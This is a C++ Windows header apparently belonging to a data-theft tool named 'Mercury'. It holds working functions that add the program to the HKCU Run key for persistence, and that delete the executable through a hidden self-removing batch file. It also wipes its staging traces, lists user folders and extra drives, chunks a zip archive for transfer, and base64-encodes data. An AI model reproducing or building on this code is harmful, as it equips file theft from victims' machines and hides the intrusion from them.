#pragma once
#include <filesystem>
#include <Windows.h>
#include <fstream>
#include <ShlObj.h>
#include "json.hpp"
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

inline std::string WStringToString(const std::wstring& wstr);


std::string PublicDir() {
    TCHAR publicDir[MAX_PATH];
    DWORD ret = GetEnvironmentVariable(TEXT("PUBLIC"), publicDir, MAX_PATH);
    std::string PubDownloadsPathStr;

    if (ret != 0) {
        std::wstring PubDownloadsPath = std::wstring(publicDir);
        PubDownloadsPathStr = WStringToString(PubDownloadsPath) + "\\";
    }
    return PubDownloadsPathStr;
}


// this function is used for big files 
std::int64_t GetFileSize(const std::wstring& path) {
    std::filesystem::path fsPath(path);
    if (std::filesystem::exists(fsPath) && std::filesystem::is_regular_file(fsPath)) {
        return std::filesystem::file_size(fsPath);
    }
    return 0;
}



bool CleanupRegistry() {
    const wchar_t* regEntryName = L"Mercury";
    HKEY hKey;
    LONG lnRes;

    // Open the key where the startup information is stored
    lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS == lnRes) {
        // Delete the value named "Mercury"
        lnRes = RegDeleteValue(hKey, regEntryName);
        // Close the registry key
        RegCloseKey(hKey);
    }

    // Return true if the operation was successful
    return lnRes == ERROR_SUCCESS;
}


void Cleanup() {
    std::string pubDir = PublicDir();

    // Check for zipped.zip and delete it
    std::string ZipFile = pubDir + "zipped.zip";
    if (std::filesystem::exists(ZipFile)) {
        std::filesystem::remove(ZipFile);
    }

    // Check if .uid exist and delete it
    std::string UidFile = pubDir + ".uid";
    if (std::filesystem::exists(UidFile)) {
        std::filesystem::remove(UidFile);
    }

    // Delete registry entry for Mercury 
    CleanupRegistry();

}


void SelfDestruct() {
    // Get the full path of the current executable
    char executablePath[MAX_PATH];
    GetModuleFileNameA(NULL, executablePath, MAX_PATH);

    // Create a temporary batch file
    std::ofstream batchFile("delete.bat");
    if (!batchFile) {
        //std::cerr << "Could not create batch file.\n";
        return;
    }

    // Write commands to the batch file to delete the executable and then the batch file itself
    batchFile << "@echo off\n";
    // wait for 10 seconds for the application to exit
    batchFile << "timeout /T 4\n";
    batchFile << ":retry\n";
    // delete the current executable
    batchFile << "del \"" << executablePath << "\"\n";
    batchFile << "if exist \"" << executablePath << "\" goto retry\n";
    // Delete the batch file itself
    batchFile << "del \"%~f0\"\n";
    batchFile.close();

    // Start the batch file hidden using ShellExecute
    ShellExecuteA(NULL, "open", "delete.bat", NULL, NULL, SW_HIDE);

    // Exit the program
    exit(0);
}


std::wstring GetFolderPath(const KNOWNFOLDERID& folderId) {
    wchar_t* pathRaw = nullptr;
    if (SHGetKnownFolderPath(folderId, 0, nullptr, &pathRaw) == S_OK) {
        std::wstring path(pathRaw);
        CoTaskMemFree(pathRaw);
        return path;
    }
    else {
        return L"";
    }
}


std::vector<std::wstring> GetSpecialPaths() {
    std::vector<std::wstring> paths;

    paths.push_back(GetFolderPath(FOLDERID_Desktop));
    paths.push_back(GetFolderPath(FOLDERID_Documents));
    paths.push_back(GetFolderPath(FOLDERID_Downloads));
    paths.push_back(GetFolderPath(FOLDERID_Pictures));
    paths.push_back(GetFolderPath(FOLDERID_SkyDrive));

    return paths;
}


inline std::string WStringToString(const std::wstring& wstr)
{
    if (wstr.empty())
        return std::string();

    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string wsTS(sizeNeeded, 0);
    if (!WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), static_cast<int>(wstr.size()), &wsTS[0], sizeNeeded, NULL, NULL)) {
        // Handle error, for this example, return an empty string
        return std::string();
    }
    return wsTS;
}


inline std::wstring StringToWString(const std::string& str)
{
    if (str.empty())
        return std::wstring();

    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), NULL, 0);
    std::wstring sTW(sizeNeeded, 0);
    if (!MultiByteToWideChar(CP_UTF8, 0, str.c_str(), static_cast<int>(str.size()), &sTW[0], sizeNeeded)) {
        // Handle error, for this example, return an empty wstring
        return std::wstring();
    }
    return sTW;
}


std::wstring GetUIDFromFile() {
    std::wstring uid;
    const int MAX_RETRIES = 10;
    int attempt = 0;

    // Get the temporary directory path and append the .uid filename
    std::string pubDir = PublicDir();
    const std::wstring fullpath = std::wstring(pubDir.begin(), pubDir.end()) + L".uid";

    while (attempt < MAX_RETRIES) {
        std::wifstream infile(fullpath);

        if (infile.is_open()) {
            std::getline(infile, uid);
            infile.close();
            return uid;
        }
        else {
            std::cerr << "Failed to open .uid file. Attempt: " << (attempt + 1) << std::endl;
            Sleep(500);  // Wait for 500 milliseconds
        }

        attempt++;
    }

    return L"";
}



bool CheckPerms(const std::wstring& path, DWORD accessRights)
{
    if (path.empty()) return false;

    HANDLE hFile = CreateFile(path.c_str(), accessRights, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        if (error == ERROR_ACCESS_DENIED)
        {
            CloseHandle(hFile);
            return false;
        }
    }

    CloseHandle(hFile);
    return true;
}


std::vector<std::wstring> Disk_ID()
{
    std::vector<std::wstring> drives;

    DWORD dwSize = MAX_PATH;
    wchar_t szLogicalDrives[MAX_PATH] = { 0 };
    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);

    if (dwResult > 0 && dwResult <= MAX_PATH)
    {
        wchar_t* szSingleDrive = szLogicalDrives;
        while (*szSingleDrive)
        {
            UINT driveType = GetDriveType(szSingleDrive);

            if (driveType == DRIVE_FIXED && CheckPerms(szSingleDrive, GENERIC_READ))
            {
                // Check if it's not the C: drive
                if (wcscmp(szSingleDrive, L"C:\\") != 0)
                {
                    drives.push_back(szSingleDrive);
                }
            }
            // Get the next drive
            szSingleDrive += wcslen(szSingleDrive) + 1;
        }
    }
    return drives;
}


nlohmann::json GenFileMetadata(const std::string& filePath, uint64_t chunkSize) {
    nlohmann::json result;

    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        throw std::runtime_error("Failed to open file.");
    }

    // Calculate total size of the zip file:
    uint64_t totalSize = static_cast<uint64_t>(file.tellg());
    file.close();

    result["total_size"] = totalSize;
    result["chunk_size"] = chunkSize;

    // Calculate chunks:
    nlohmann::json chunks;
    uint64_t chunkCount = (totalSize + chunkSize - 1) / chunkSize;
    for (uint64_t i = 0; i < chunkCount; ++i) {
        uint64_t startByte = i * chunkSize;
        uint64_t endByte = (std::min)(startByte + chunkSize - 1, totalSize - 1);
        chunks[std::to_string(i)] = { startByte, endByte };
    }

    result["chunks"] = chunks;

    return result;
}


std::vector<char> RetReqBytes(const std::string& filePath, int start_byte, int end_byte) {
    std::ifstream file(filePath, std::ios::binary);
    std::vector<char> buffer(end_byte - start_byte + 1);

    if (!file) {
        // Handle error
        return {};
    }

    file.seekg(start_byte);
    file.read(buffer.data(), buffer.size());

    return buffer;
}


std::string EncodeBase64(const std::string& input) {
    DWORD encodedSize = 0;

    // Determine the required buffer size without actually encoding:
    if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.c_str()), 
        static_cast<DWORD>(input.size()), 
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
        NULL, 
        &encodedSize)) {
        return "";
    }

    std::vector<char> encodedData(encodedSize);
    if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.c_str()), 
        static_cast<DWORD>(input.size()), 
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
        encodedData.data(), 
        &encodedSize)) {
        return "";
    }

    return std::string(encodedData.begin(), encodedData.end());
}


bool PersistOnMachine() {
    WCHAR szPath[MAX_PATH];
    WCHAR szExeName[MAX_PATH];
    WCHAR* szExeNameWithoutExt;

    // Get the full path of the current executable
    if (!GetModuleFileNameW(NULL, szPath, MAX_PATH)) {
        return false;
    }

    // Extract the executable name from the path
    szExeNameWithoutExt = wcsrchr(szPath, L'\\') + 1;
    wcscpy_s(szExeName, szExeNameWithoutExt);

    // Remove .exe extension
    WCHAR* dot = wcsrchr(szExeName, L'.');
    if (dot != NULL) {
        *dot = L'\0';
    }

    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (ERROR_SUCCESS == lnRes) {
        lnRes = RegSetValueEx(hKey, szExeName, 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
    }
    return lnRes == ERROR_SUCCESS;
}


